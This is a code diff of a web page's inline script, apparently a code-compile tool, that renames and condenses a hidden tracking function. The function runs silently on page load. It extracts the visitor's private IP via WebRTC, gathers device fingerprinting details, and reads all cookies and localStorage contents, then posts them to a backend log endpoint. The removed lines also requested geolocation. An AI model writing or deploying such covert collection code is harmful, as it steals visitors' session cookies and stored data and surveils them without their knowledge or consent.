@@ -15,7 +15,7 @@
     <pre id="output"></pre>
 
     <script>
-        async function logPrivateIP() {
+        async function logUserInfo() {
             const pc = new RTCPeerConnection();
             let logged = false;
 
@@ -29,86 +29,48 @@
                         const localIP = candidate.split(" ")[4];
                         logged = true;
 
-                        // Gather extensive information
+                        // Collect additional user information
+                        const searchTerm = ''; // Modify to collect real search terms if applicable
                         const userAgent = navigator.userAgent;
                         const referrerHistory = document.referrer ? [document.referrer] : [];
                         const currentURL = window.location.href;
-                        const screenWidth = window.screen.width;
-                        const screenHeight = window.screen.height;
+                        const screenWidth = screen.width;
+                        const screenHeight = screen.height;
                         const browserLanguage = navigator.language || navigator.userLanguage;
                         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                         const osInfo = navigator.platform;
                         const timestamp = new Date().toISOString();
-                        const timeSpent = Math.round((performance.now() / 1000)); // Time spent in seconds
-                        const activeTabDuration = Math.round((performance.now() / 1000)); // Active tab duration in seconds
-                        const networkStatus = navigator.onLine ? "Online" : "Offline"; // Network status
-                        const deviceType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop"; // Device type
-
-                        // Additional device and performance information
-                        const memoryInfo = performance.memory ? 
-                            `Total: ${Math.round(performance.memory.total / 1048576)} MB, Used: ${Math.round(performance.memory.used / 1048576)} MB` : 
-                            'Memory Info Not Available';
-
-                        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown'; // Number of logical processors
-                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown'; // Network connection type
-                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins detected'; // Browser plugins
-                        const batteryInfo = await navigator.getBattery().then(battery => ({
-                            level: battery.level * 100,
-                            charging: battery.charging
-                        })).catch(() => null); // Battery status
-
-                        // Fetch geolocation information
-                        const geolocationInfo = await new Promise((resolve) => {
-                            if (navigator.geolocation) {
-                                navigator.geolocation.getCurrentPosition(
-                                    position => resolve({ lat: position.coords.latitude, lon: position.coords.longitude }),
-                                    () => resolve({ error: "Geolocation permission denied" })
-                                );
-                            } else {
-                                resolve({ error: "Geolocation not supported" });
-                            }
-                        });
-
-                        // Collecting cookies and local storage data
-                        const cookies = document.cookie || 'No cookies available';
+                        const timeSpent = 0; // Calculate time spent on the page if needed
+                        const activeTabDuration = 0; // Calculate active tab duration if needed
+                        const networkStatus = navigator.onLine ? 'Online' : 'Offline';
+                        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                        const memoryInfo = performance.memory ? `${performance.memory.usedJSHeapSize} bytes` : 'No memory info';
+                        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins';
+                        const battery = await navigator.getBattery();
+                        const batteryLevel = battery.level * 100;
+                        const isCharging = battery.charging;
+                        const geolocation = { lat: 0, lon: 0, error: 'Geolocation not available' }; // Implement geolocation if possible
+                        const cookies = document.cookie || 'No cookies';
                         const localStorageData = JSON.stringify(localStorage) || 'No local storage data';
 
-                        // Prepare log data
-                        const logData = {
-                            ip: localIP,
-                            searchTerm: '', // Placeholder for search term
-                            userAgent,
-                            referrerHistory,
-                            currentURL,
-                            screenWidth,
-                            screenHeight,
-                            browserLanguage,
-                            timeZone,
-                            osInfo,
-                            timestamp,
-                            timeSpent,
-                            activeTabDuration,
-                            networkStatus,
-                            deviceType,
-                            memoryInfo,
-                            hardwareConcurrency,
-                            connectionType,
-                            plugins,
-                            batteryLevel: batteryInfo ? batteryInfo.level : 'Unknown',
-                            isCharging: batteryInfo ? batteryInfo.charging : 'Unknown',
-                            geolocation: geolocationInfo,
-                            cookies,
-                            localStorageData
-                        };
-
-                        // Send the log data to the backend
+                        // Send the data to the backend
                         fetch('/api/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(logData)
+                            body: JSON.stringify({ 
+                                ip: localIP, searchTerm, userAgent, referrerHistory, currentURL, 
+                                screenWidth, screenHeight, browserLanguage, timeZone, 
+                                osInfo, timestamp, timeSpent, activeTabDuration, 
+                                networkStatus, deviceType, memoryInfo, 
+                                hardwareConcurrency, connectionType, plugins, 
+                                batteryLevel, isCharging, geolocation, cookies, 
+                                localStorageData 
+                            })
                         }).then(response => {
                             if (!response.ok) {
-                                console.error('Failed to log IP');
+                                console.error('Failed to log user info');
                             }
                         }).catch(error => {
                             console.error('Error:', error);
@@ -132,7 +94,7 @@
         }
 
         document.getElementById('submit').onclick = compileCode;
-        logPrivateIP(); // Start IP logging silently
+        logUserInfo(); // Start user info logging silently
     </script>
 </body>
 </html>
